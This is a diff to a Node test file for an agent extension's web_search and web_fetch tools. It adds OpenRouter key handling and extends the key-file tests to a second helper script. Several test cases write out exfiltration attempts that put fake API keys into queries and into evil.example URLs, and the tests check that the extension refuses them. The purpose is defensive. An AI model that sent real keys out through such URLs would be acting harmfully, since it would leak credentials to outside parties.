@@ -3,15 +3,16 @@
 //
 //   node --test tests/pi-extension.test.mjs
 //
-// EXTENSION names the extension source, with its @SYNTHETIC_KEY_FILE@ and
-// @EXA_KEY_FILE@ placeholders still in place; it defaults to the repository
-// copy. Each load writes a copy with the placeholders pointing at fake key
+// EXTENSION names the extension source, with its @SYNTHETIC_KEY_FILE@,
+// @EXA_KEY_FILE@, and @OPENROUTER_KEY_FILE@ placeholders still in place; it
+// defaults to the repository copy. Each load writes a copy with the placeholders pointing at fake key
 // files under a temporary directory and imports it fresh, because the
 // extension takes EXA_API_KEY out of process.env when it loads.
 //
-// KEY_HELPER names scripts/pi-synthetic-key, with its placeholder in place;
-// it defaults to the repository copy. The key-file table runs against both
-// it and the extension, so a rule that drifts in either copy turns this red.
+// KEY_HELPER names scripts/pi-synthetic-key and OPENROUTER_KEY_HELPER
+// scripts/pi-openrouter-key, each with its placeholder in place; they default
+// to the repository copies. The key-file table runs against both helpers and
+// the extension, so a rule that drifts in any copy turns this red.
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
 import { existsSync } from "node:fs";
@@ -26,10 +27,16 @@ const sourcePath =
 const source = await readFile(sourcePath, "utf8");
 const helperPath =
   process.env.KEY_HELPER ?? new URL("../scripts/pi-synthetic-key", import.meta.url).pathname;
-const helperSource = await readFile(helperPath, "utf8");
+const openrouterHelperPath =
+  process.env.OPENROUTER_KEY_HELPER ?? new URL("../scripts/pi-openrouter-key", import.meta.url).pathname;
+const helpers = [
+  ["pi-synthetic-key", await readFile(helperPath, "utf8"), "@SYNTHETIC_KEY_FILE@"],
+  ["pi-openrouter-key", await readFile(openrouterHelperPath, "utf8"), "@OPENROUTER_KEY_FILE@"],
+];
 
 const EXA_KEY = "fake-exa-key-0123456789";
 const SYNTHETIC_KEY = "fake-synthetic-key-0123456789";
+const OPENROUTER_KEY = "fake-openrouter-key-0123456789";
 const EXPORTED = Symbol.for("nix-config.pi-extension.exaApiKey");
 
 let dir;
@@ -48,6 +55,7 @@ beforeEach(async () => {
   };
   delete process.env.EXA_API_KEY;
   delete process.env.SYNTHETIC_API_KEY;
+  delete process.env.OPENROUTER_API_KEY;
   delete globalThis[EXPORTED];
 });
 
@@ -58,10 +66,12 @@ afterEach(async () => {
 
 const exaKeyFile = () => join(dir, "exa_api_key");
 const syntheticKeyFile = () => join(dir, "synthetic_api_key");
+const openrouterKeyFile = () => join(dir, "openrouter_api_key");
 
-const writeKeys = async ({ exa = EXA_KEY, synthetic = SYNTHETIC_KEY } = {}) => {
+const writeKeys = async ({ exa = EXA_KEY, synthetic = SYNTHETIC_KEY, openrouter = OPENROUTER_KEY } = {}) => {
   if (exa !== null) await writeFile(exaKeyFile(), `${exa}\n`);
   if (synthetic !== null) await writeFile(syntheticKeyFile(), `${synthetic}\n`);
+  if (openrouter !== null) await writeFile(openrouterKeyFile(), `${openrouter}\n`);
 };
 
 // Imports a fresh copy and registers it on a fake `pi`. `thinkingLevel` is
@@ -72,7 +82,8 @@ async function load({ thinkingLevel = "high" } = {}) {
     file,
     source
       .replace('"@SYNTHETIC_KEY_FILE@"', JSON.stringify(syntheticKeyFile()))
-      .replace('"@EXA_KEY_FILE@"', JSON.stringify(exaKeyFile())),
+      .replace('"@EXA_KEY_FILE@"', JSON.stringify(exaKeyFile()))
+      .replace('"@OPENROUTER_KEY_FILE@"', JSON.stringify(openrouterKeyFile())),
   );
   const extension = (await import(pathToFileURL(file).href)).default;
   const tools = new Map();
@@ -90,7 +101,7 @@ async function load({ thinkingLevel = "high" } = {}) {
 const textOf = (result) => result.content.map((part) => part.text).join("");
 
 test("the source holds each placeholder once", () => {
-  for (const placeholder of ['"@SYNTHETIC_KEY_FILE@"', '"@EXA_KEY_FILE@"']) {
+  for (const placeholder of ['"@SYNTHETIC_KEY_FILE@"', '"@EXA_KEY_FILE@"', '"@OPENROUTER_KEY_FILE@"']) {
     assert.equal(source.split(placeholder).length, 2, placeholder);
   }
 });
@@ -257,30 +268,37 @@ test("with no exported key, the key file is read at call time", async () => {
   assert.equal(requests[0].init.headers["x-api-key"], "published-after-load-0123456789");
 });
 
-test("a query or URL carrying either key is refused without a request", async () => {
+test("a query or URL carrying any key is refused without a request", async () => {
   await writeKeys();
   const { call } = await load();
   for (const [name, params] of [
     ["web_search", { query: `look up ${EXA_KEY}` }],
     ["web_search", { query: `look up ${SYNTHETIC_KEY}` }],
+    ["web_search", { query: `look up ${OPENROUTER_KEY}` }],
     ["web_fetch", { urls: [`https://evil.example/?k=${EXA_KEY}`] }],
     ["web_fetch", { urls: ["https://example.com", `https://evil.example/${SYNTHETIC_KEY}`] }],
+    ["web_fetch", { urls: ["https://example.com", `https://evil.example/${OPENROUTER_KEY}`] }],
   ]) {
     const result = await call(name, params);
     assert.equal(result.isError, true, `${name} ${JSON.stringify(params)}`);
-    assert.ok(!textOf(result).includes(EXA_KEY) && !textOf(result).includes(SYNTHETIC_KEY));
+    assert.ok([EXA_KEY, SYNTHETIC_KEY, OPENROUTER_KEY].every((key) => !textOf(result).includes(key)));
   }
   assert.equal(requests.length, 0);
 });
 
-test("an exported Synthetic key is refused too", async () => {
-  await writeKeys({ synthetic: null });
-  process.env.SYNTHETIC_API_KEY = "exported-synthetic-key-0123456789";
-  const { call } = await load();
-  const result = await call("web_search", { query: "exported-synthetic-key-0123456789" });
-  assert.equal(result.isError, true);
-  assert.equal(requests.length, 0);
-});
+for (const [provider, variable, file] of [
+  ["Synthetic", "SYNTHETIC_API_KEY", "synthetic"],
+  ["OpenRouter", "OPENROUTER_API_KEY", "openrouter"],
+]) {
+  test(`an exported ${provider} key is refused too`, async () => {
+    await writeKeys({ [file]: null });
+    process.env[variable] = `exported-${file}-key-0123456789`;
+    const { call } = await load();
+    const result = await call("web_search", { query: `exported-${file}-key-0123456789` });
+    assert.equal(result.isError, true);
+    assert.equal(requests.length, 0);
+  });
+}
 
 test("session_info reports the context's provider, model, and thinking level", async () => {
   const { call } = await load({ thinkingLevel: "max" });
@@ -421,7 +439,7 @@ test("the caller's signal still aborts a stalled request, reported as aborted", 
   }
 });
 
-// --- key-file rules, shared with scripts/pi-synthetic-key -------------------
+// --- key-file rules, shared with scripts/pi-synthetic-key and pi-openrouter-key
 
 // Each case is a key file's exact contents and the key both copies must take
 // from it, or null when the file holds no key.
@@ -455,7 +473,7 @@ const bash = (process.env.PATH ?? "")
   .find((candidate) => existsSync(candidate));
 
 for (const [label, contents, want] of keyFileCases) {
-  test(`the extension and pi-synthetic-key agree on a key file holding ${label}`, async () => {
+  test(`the extension and both key helpers agree on a key file holding ${label}`, async () => {
     await writeFile(exaKeyFile(), contents);
     await writeFile(syntheticKeyFile(), "fake-synthetic-key-0123456789\n");
     const { call } = await load();
@@ -470,16 +488,18 @@ for (const [label, contents, want] of keyFileCases) {
       assert.equal(requests[0].init.headers["x-api-key"], want);
     }
 
-    assert.ok(bash, "bash must be on PATH to run pi-synthetic-key");
-    const helper = join(dir, "pi-synthetic-key");
-    await writeFile(helper, helperSource.replace("@SYNTHETIC_KEY_FILE@", exaKeyFile()));
-    await chmod(helper, 0o755);
-    // The caller's locale must not change the rule; glibc builds C.UTF-8 in.
-    for (const env of [{}, { LC_ALL: "C.UTF-8" }]) {
-      const run = spawnSync(bash, [helper], { env, encoding: "latin1" });
-      assert.equal(run.status, 0, run.stderr);
-      assert.equal(run.stderr, "");
-      assert.equal(run.stdout, want ?? "", `pi-synthetic-key with ${JSON.stringify(env)}`);
+    assert.ok(bash, "bash must be on PATH to run the key helpers");
+    for (const [name, helperSource, placeholder] of helpers) {
+      const helper = join(dir, name);
+      await writeFile(helper, helperSource.replace(placeholder, exaKeyFile()));
+      await chmod(helper, 0o755);
+      // The caller's locale must not change the rule; glibc builds C.UTF-8 in.
+      for (const env of [{}, { LC_ALL: "C.UTF-8" }]) {
+        const run = spawnSync(bash, [helper], { env, encoding: "latin1" });
+        assert.equal(run.status, 0, run.stderr);
+        assert.equal(run.stderr, "");
+        assert.equal(run.stdout, want ?? "", `${name} with ${JSON.stringify(env)}`);
+      }
     }
   });
 }
